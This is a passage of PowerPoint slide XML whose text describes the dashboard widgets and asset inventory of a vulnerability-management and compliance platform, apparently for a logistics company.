          <p:cNvPr id="39" name="Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="301752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8600" y="3054096"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  What the Dashboard Contains — Widget-by-Widget Breakdown</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3337560"/>
            <a:ext cx="2331720" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="508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28600" y="3337560"/>
            <a:ext cx="233172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8328" y="3429000"/>
            <a:ext cx="2112264" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security Score Widget</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="3685032"/>
            <a:ext cx="211226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38328" y="3758184"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Weighted average across 6 security domains: Vulnerability Coverage, Patch Rate,</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="4032504"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compliance Score, Exploit Defense Rate, Threat Intel Currency, and IR Response Time.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="4306824"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Score recalculates automatically when data changes — patching a CVE raises it immediately.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="4581144"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Colour-coded: green ≥80, amber 60–79, red &lt;60. Trend arrow shows 30-day delta.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Rectangle 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2624328" y="3337560"/>
            <a:ext cx="2331720" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="508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624328" y="3337560"/>
            <a:ext cx="233172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34056" y="3429000"/>
            <a:ext cx="2112264" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KPI Cards Row</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2734056" y="3685032"/>
            <a:ext cx="211226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34056" y="3758184"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Six live counters: open CVEs by severity, total monitored assets, exploit success rate,</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2734056" y="4032504"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>patches pending merge, active incidents, and average compliance across all frameworks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2734056" y="4306824"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each card is clickable — tapping 'Open CVEs' jumps directly to the Vulnerabilities page.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2734056" y="4581144"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Numbers update in real time as backend events are processed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Rectangle 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5020056" y="3337560"/>
            <a:ext cx="2331720" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="508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20056" y="3337560"/>
            <a:ext cx="233172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9784" y="3429000"/>
            <a:ext cx="2112264" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Timeline Chart</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Rectangle 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5129784" y="3685032"/>
            <a:ext cx="211226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29784" y="3758184"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A chronological bar chart of every sandbox simulation result.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5129784" y="4032504"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Green bars = exploit blocked (defence held). Red bars = exploit succeeded (vulnerable).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5129784" y="4306824"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hovering a bar shows the CVE, MITRE technique, confidence score, and sandbox ID.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5129784" y="4581144"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Helps the team spot trends — e.g. a spike in successful exploits after a new service is added.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Rectangle 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415784" y="3337560"/>
            <a:ext cx="2331720" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="508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415784" y="3337560"/>
            <a:ext cx="233172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25512" y="3429000"/>
            <a:ext cx="2112264" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Compliance Overview</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Rectangle 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7525512" y="3685032"/>
            <a:ext cx="211226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25512" y="3758184"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Progress bars for each active framework: ISO 27001, SOC 2, PCI-DSS, GDPR.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7525512" y="4032504"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shows passing / in-progress / failing control counts and an overall percentage score.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7525512" y="4306824"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A single failing CRITICAL control turns the bar red — gives instant audit readiness signal.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7525512" y="4581144"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Links directly to the full Compliance page for drill-down per framework.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Rectangle 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9811512" y="3337560"/>
            <a:ext cx="2331720" cy="2212848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="508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811512" y="3337560"/>
            <a:ext cx="233172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921240" y="3429000"/>
            <a:ext cx="2112264" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>API Integration Status</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Rectangle 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9921240" y="3685032"/>
            <a:ext cx="2112264" cy="18288"/>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921240" y="3758184"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shows every connected tool: GitHub, GitLab, AWS, GCP, Azure, Slack, Jira, NVD, CISA.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9921240" y="4032504"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each entry shows last-sync timestamp, connection status, and count of CVEs surfaced.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9921240" y="4306824"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Warning badge appears if a feed has not synced in &gt;24h — prevents stale data blind spots.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9921240" y="4581144"/>
            <a:ext cx="2112264" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Click 'Manage' to go to the Integrations page and reconfigure or reconnect.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Rectangle 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5623560"/>
            <a:ext cx="11731752" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="05150F"/>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5760" y="5715000"/>
            <a:ext cx="11457432" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Real-Time Activity Feed (bottom of page) — streams the last 10 security events live: exploit simulation completed, CVE sync from NVD, patch PR opened on GitHub, threat feed updated, compliance report generated, asset scan completed. Each entry shows UTC timestamp, event type colour-coded by category, detail payload, and actor (sentinel-ai, operator:web-ui, or a named analyst). This replaces the need to check logs manually.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Asset Inventory</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The authoritative registry of every monitored asset — the foundation all other modules link back to</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Asset Inventory is where GlobalShip Logistics' entire infrastructure is catalogued. Every server, microservice, container, database, and IoT gateway has a record here. This is not a passive CMDB — it is the live source of truth that drives vulnerability correlation, exploit targeting, patch ownership, and compliance evidence. When a new CVE is ingested, the platform immediately looks up which assets are running the affected component using the tags and installed apps fields. Assets can be added manually, imported from cloud APIs (AWS, GCP, Azure), or discovered automatically via the Infra Scanner.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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21408"/>
            <a:ext cx="228600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12848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Total Assets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Seeded for logistics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2121408"/>
            <a:ext cx="2286000" cy="77724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6040" y="2121408"/>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212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
